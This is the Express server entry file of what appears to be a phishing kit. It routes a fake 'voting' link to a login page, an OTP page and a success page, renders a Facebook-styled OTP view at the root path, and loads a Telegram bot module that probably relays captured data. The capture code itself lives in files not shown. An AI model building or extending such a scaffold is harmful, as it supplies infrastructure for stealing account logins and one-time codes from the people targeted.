const express = require('express');
const path = require('path');
const app = express();
require("dotenv").config();
require("./lib/telegramBot");
require("./lib/mongodb");

// Set EJS as templating engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Import routes
const votingRouter = require('./routes/slink');
const loginRouter = require('./routes/slink/lgin');
const otpRouter = require('./routes/slink/otp');
const successRouter = require('./routes/slink/success');
const apiRouter = require('./routes/api');


// Use routes
app.use('/slink', votingRouter);
app.use('/slink/lgin', loginRouter);
app.use('/slink/otp', otpRouter);
app.use('/slink/success', successRouter);
app.use('/api', apiRouter);
app.use("/not-found", (req, res) => {
    res.render('not-found');
});
// Basic route
app.get('/', (req, res) => {
    res.render('social/facebook-otp', { message: 'Hello World!' });
});

// not found for everything else
app.use((req, res) => {
    res.status(404).render('not-found');
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});